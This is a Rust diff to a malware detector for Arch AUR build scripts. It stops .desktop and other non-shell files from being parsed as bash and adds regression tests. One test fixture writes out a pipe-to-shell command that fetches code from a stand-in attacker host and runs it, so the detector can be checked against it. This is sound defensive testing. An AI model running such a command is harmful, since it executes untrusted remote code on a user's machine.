@@ -134,6 +134,14 @@ impl Detector for PkgbuildStaticDetector {
             Ok(s) => s,
             Err(_) => return DetectorResult::default(),
         };
+        // `Other` covers every non-script file riding in a clone (.desktop,
+        // .json, .conf, ...). Feeding those to a bash parser produced garbage
+        // findings: zen-browser's zen.desktop, hundreds of translated
+        // Keywords[] lines, misparsed into "strings" and flagged as opaque
+        // blobs. Only parse Other targets that are actually shell.
+        if matches!(kind, ScriptKind::Other) && !looks_like_shell(path, &src) {
+            return DetectorResult::default();
+        }
         let location = path.display().to_string();
 
         let mut parser = tree_sitter::Parser::new();
@@ -538,6 +546,24 @@ impl<'a> Walker<'a> {
     }
 }
 
+/// True when a miscellaneous clone file is a shell script: a `.sh`/`.bash`
+/// extension, or a shebang whose interpreter is a shell. Everything else
+/// (.desktop, .json, .conf, plain data) must not go through the bash parser.
+/// ioc_tokens and payload_hashes still scan such files -- exact matchers do
+/// not care about syntax.
+fn looks_like_shell(path: &std::path::Path, src: &str) -> bool {
+    let ext = path
+        .extension()
+        .map(|e| e.to_ascii_lowercase())
+        .unwrap_or_default();
+    if ext == "sh" || ext == "bash" {
+        return true;
+    }
+    src.lines()
+        .next()
+        .is_some_and(|first| first.starts_with("#!") && first.contains("sh"))
+}
+
 /// True when a `git` invocation uses a subcommand that cannot reach the
 /// network, so it is not an out-of-band fetch.
 ///
@@ -682,6 +708,53 @@ mod tests {
             "package() {\n  install -Dm644 /dev/stdin \"$pkgdir/usr/share/fish/vendor_completions.d/wt.fish\" <<'EOF'\ncompletions\nEOF\n}\n",
         );
         assert!(got.is_empty(), "expected no write finding, got {got:?}");
+    }
+
+    fn scan_other_file(name: &str, content: &str) -> Vec<Finding> {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join(name);
+        std::fs::write(&path, content).unwrap();
+        let det = PkgbuildStaticDetector::new();
+        let target = ScanTarget::BuildScript {
+            path,
+            kind: ScriptKind::Other,
+        };
+        let ctx = ScanContext {
+            package: "t".into(),
+            version: "1".into(),
+            aur_meta: None,
+        };
+        det.scan(&target, &ctx).findings
+    }
+
+    #[test]
+    fn desktop_files_are_not_parsed_as_bash() {
+        // Regression: zen-browser's zen.desktop (hundreds of translated
+        // Keywords[]/Name[] lines) was misparsed by tree-sitter-bash and
+        // flagged as opaque blobs, at Medium, twice.
+        let translations: String = (0..40)
+            .map(|i| format!("Keywords[l{i}]=Ïntérnét;WWW;Bröwsér;Wéb;Éxplörér;çäöü;\n"))
+            .collect();
+        let got = scan_other_file("zen.desktop", &format!("[Desktop Entry]\n{translations}"));
+        assert!(got.is_empty(), "got {got:?}");
+    }
+
+    #[test]
+    fn shell_helpers_in_a_clone_are_still_parsed() {
+        // The Other kind also covers real helper scripts, which must keep
+        // being scanned -- by extension or by shebang.
+        for name in ["helper.sh", "helper"] {
+            let content = if name.ends_with(".sh") {
+                "curl https://evil.example/x | bash\n".to_string()
+            } else {
+                "#!/usr/bin/env bash\ncurl https://evil.example/x | bash\n".to_string()
+            };
+            let got = scan_other_file(name, &content);
+            assert!(
+                got.iter().any(|f| f.reason.contains("piped directly")),
+                "{name}: got {got:?}"
+            );
+        }
     }
 
     #[test]
